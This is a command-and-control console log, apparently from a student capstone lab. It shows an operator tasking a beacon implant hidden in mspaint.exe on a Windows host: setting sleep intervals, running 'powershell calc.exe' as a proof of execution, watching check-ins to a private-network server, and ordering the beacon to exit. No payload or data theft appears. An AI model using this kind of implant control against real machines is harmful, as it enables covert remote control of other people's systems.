04/04 11:51:44 UTC [metadata] 192.168.255.1 <- 192.168.43.167; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 20748; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
04/04 11:51:48 UTC [input] <neo> sleep 10
04/04 11:51:48 UTC [task] <T1029> Tasked beacon to sleep for 10s
04/04 11:52:08 UTC [input] <neo> connect
04/04 11:52:08 UTC [error] connect error: not enough arguments
04/04 11:52:17 UTC [input] <neo> powershell
04/04 11:52:17 UTC [error] powershell error: not enough arguments
04/04 11:52:36 UTC [checkin] host called home, sent: 16 bytes
04/04 11:52:56 UTC [checkin] host called home, sent: 19 bytes
04/04 11:52:56 UTC [error] could not open D:\Lesson\Nam 4\Capstone\Testcap\*: 3
04/04 11:52:57 UTC [input] <neo> sleep 5
04/04 11:52:57 UTC [task] <T1029> Tasked beacon to sleep for 5s
04/04 11:53:06 UTC [checkin] host called home, sent: 16 bytes
04/04 11:53:18 UTC [input] <neo> powershell calculator.exe
04/04 11:53:18 UTC [task] <T1086> Tasked beacon to run: calculator.exe
04/04 11:53:21 UTC [checkin] host called home, sent: 103 bytes
04/04 11:53:22 UTC [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">calculator.exe : The term 'calculator.exe' is not recognized as the name of a cmdlet, function, script file, or _x000D__x000A_</S><S S="Error">operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try _x000D__x000A_</S><S S="Error">again._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ calculator.exe_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (calculator.exe:String) [], CommandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

04/04 11:54:00 UTC [input] <neo> powershell calc.exe
04/04 11:54:00 UTC [task] <T1086> Tasked beacon to run: calc.exe
04/04 11:54:02 UTC [checkin] host called home, sent: 87 bytes
04/04 12:01:23 UTC [input] <neo> powershell calc.exe
04/04 12:01:23 UTC [task] <T1086> Tasked beacon to run: calc.exe
04/04 12:01:24 UTC [checkin] host called home, sent: 87 bytes
04/04 12:09:56 UTC [checkin] host called home, sent: 96 bytes
04/04 12:09:56 UTC [error] could not open D:\Lesson\Nam 4\Capstone\*: 3
04/04 12:10:01 UTC [checkin] host called home, sent: 34 bytes
04/04 12:14:31 UTC [metadata] 192.168.255.1 <- 192.168.43.167; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 20748; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
04/04 12:16:15 UTC [input] <neo> exit
04/04 12:16:15 UTC [task] <> Tasked beacon to exit
04/04 12:16:21 UTC [metadata] 192.168.255.1 <- 192.168.43.167; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 20748; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
04/04 12:16:18 UTC [checkin] host called home, sent: 8 bytes
04/04 12:16:18 UTC [output]
beacon exit.

